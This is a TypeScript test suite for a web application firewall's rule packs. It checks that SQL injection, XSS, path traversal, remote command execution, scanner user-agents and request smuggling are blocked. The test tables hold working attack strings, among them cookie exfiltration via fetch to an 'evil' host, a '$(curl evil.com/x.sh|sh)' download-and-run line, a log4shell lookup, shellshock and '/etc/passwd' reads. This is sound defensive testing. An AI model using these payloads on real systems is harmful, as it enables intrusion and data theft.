/**
 * Tests for the built-in SQLi/XSS/traversal/RCE rule packs via the Waf facade.
 */

import { describe, it, expect, beforeEach } from 'bun:test';
import { Waf } from '../strategies/Waf';
import { HttpRequest } from '../types/http';

const req = (over: Partial<HttpRequest> = {}): HttpRequest => ({
  method: 'POST',
  path: '/',
  query: {},
  headers: {},
  clientIp: '10.0.0.1',
  ...over,
});

describe('Waf — SQLi rules', () => {
  let waf: Waf;
  beforeEach(() => {
    waf = new Waf();
  });

  const attacks: Array<[string, string]> = [
    ['union select', "' UNION SELECT username,password FROM users--"],
    ['tautology', "' OR '1'='1' --"],
    ['comment tail', "admin'--"],
    ['stacked query', "1; DROP TABLE users--"],
    ['sleep delay', "' OR SLEEP(5)--"],
    ['information schema', "UNION SELECT table_name FROM information_schema.tables"],
    ['load_file', "' UNION SELECT LOAD_FILE('/etc/passwd')--"],
  ];

  for (const [name, payload] of attacks) {
    it(`blocks: ${name}`, () => {
      const v = waf.inspect(req({ body: payload }));
      expect(v.action).toBe('block');
      expect(v.matched.some((m) => m.ruleId.startsWith('sqli-'))).toBe(true);
    });
  }

  it('allows clean body', () => {
    const v = waf.inspect(req({ body: 'username=alice&password=hunter2' }));
    expect(v.action).toBe('allow');
  });

  it('catches query-param SQLi', () => {
    const v = waf.inspect(req({ query: { id: "1' OR '1'='1" }, method: 'GET' }));
    expect(v.action).toBe('block');
  });
});

describe('Waf — XSS rules', () => {
  let waf: Waf;
  beforeEach(() => {
    waf = new Waf();
  });

  const attacks: Array<[string, string]> = [
    ['script tag', '<script>alert(1)</script>'],
    ['img onerror', '<img src=x onerror=alert(1)>'],
    ['svg onload', '<svg onload=alert(1)>'],
    ['javascript uri', 'javascript:alert(1)'],
    ['document.cookie', 'var c=document.cookie; fetch("//evil/"+c)'],
    ['encoded script', '%3Cscript%3Ealert(1)%3C/script%3E'],
  ];

  for (const [name, payload] of attacks) {
    it(`blocks: ${name}`, () => {
      const v = waf.inspect(req({ body: payload }));
      expect(v.action).toBe('block');
      expect(v.matched.some((m) => m.ruleId.startsWith('xss-'))).toBe(true);
    });
  }

  it('allows clean body', () => {
    expect(waf.inspect(req({ body: '<b>hello world</b>' })).action).toBe('allow');
  });
});

describe('Waf — Path traversal rules', () => {
  let waf: Waf;
  beforeEach(() => {
    waf = new Waf();
  });

  const attacks: Array<[string, string]> = [
    ['../ traversal', '/../../etc/passwd'],
    ['encoded ..%2f', '/..%2f..%2fetc%2fpasswd'],
    ['double-encoded', '/%252e%252e%252f'],
    ['/etc/passwd', '/etc/passwd'],
    ['/proc/self', '/proc/self/environ'],
    ['windows path', '/c:/windows/system32/drivers/etc/hosts'],
    ['null byte', '/file%00.php'],
  ];

  for (const [name, path] of attacks) {
    it(`blocks: ${name}`, () => {
      const v = waf.inspect(req({ path, method: 'GET' }));
      expect(v.action).toBe('block');
    });
  }

  it('allows clean path', () => {
    expect(waf.inspect(req({ path: '/api/v1/users' })).action).toBe('allow');
  });
});

describe('Waf — RCE rules', () => {
  let waf: Waf;
  beforeEach(() => {
    waf = new Waf();
  });

  const attacks: Array<[string, string]> = [
    ['shell metachar', 'file.txt; cat /etc/passwd'],
    ['command subst', '$(curl evil.com/x.sh|sh)'],
    ['log4shell', '${jndi:ldap://evil.com/a}'],
    ['shellshock', '() { :;}; /bin/bash -c "id"'],
    ['powershell -enc', 'powershell -enc SQBFAFgAIAAo...'],
    ['template injection', '{{7*7}}'],
  ];

  for (const [name, payload] of attacks) {
    it(`blocks: ${name}`, () => {
      const v = waf.inspect(req({ body: payload }));
      expect(v.action).toBe('block');
    });
  }
});

describe('Waf — header rules', () => {
  let waf: Waf;
  beforeEach(() => {
    waf = new Waf();
  });

  it('blocks known scanner UA', () => {
    const v = waf.inspect(req({ headers: { 'user-agent': 'sqlmap/1.7' } }));
    expect(v.action).toBe('block');
    expect(v.matched.some((m) => m.ruleId === 'hdr-scanner-ua')).toBe(true);
  });

  it('blocks shellshock in UA', () => {
    const v = waf.inspect(req({ headers: { 'user-agent': '() { :;}; /bin/bash' } }));
    expect(v.action).toBe('block');
  });

  it('logs curl UA but does not block', () => {
    const v = waf.inspect(req({ headers: { 'user-agent': 'curl/8.0' } }));
    // 'curl/' matches the log rule (curl-python-ua) — should appear in matched
    expect(v.matched.some((m) => m.ruleId === 'hdr-curl-python-ua')).toBe(true);
  });
});

describe('Waf — ACL', () => {
  it('whitelisted client bypasses all rules', () => {
    const waf = new Waf();
    waf.acl.allow('203.0.113.10');
    const v = waf.inspect(
      req({ clientIp: '203.0.113.10', body: "' UNION SELECT * FROM users--" })
    );
    expect(v.action).toBe('allow');
    expect(v.reasons).toContain('client-ip-whitelisted');
  });

  it('blacklisted client blocked regardless of payload', () => {
    const waf = new Waf();
    waf.acl.deny('198.51.100.5');
    const v = waf.inspect(req({ clientIp: '198.51.100.5', body: 'clean' }));
    expect(v.action).toBe('block');
    expect(v.reasons).toContain('client-ip-blacklisted');
  });

  it('CIDR whitelist covers subnet', () => {
    const waf = new Waf();
    waf.acl.allow('10.8.0.0/16');
    expect(waf.acl.check('10.8.1.5')).toBe('allow');
    expect(waf.acl.check('10.9.0.1')).toBe('neutral');
  });
});

describe('Waf — request smuggling', () => {
  it('blocks when both TE and CL present', () => {
    const waf = new Waf();
    const v = waf.inspect(
      req({ headers: { 'transfer-encoding': 'chunked', 'content-length': '5' } })
    );
    expect(v.action).toBe('block');
    expect(v.reasons).toContain('ambiguous-framing');
  });
});
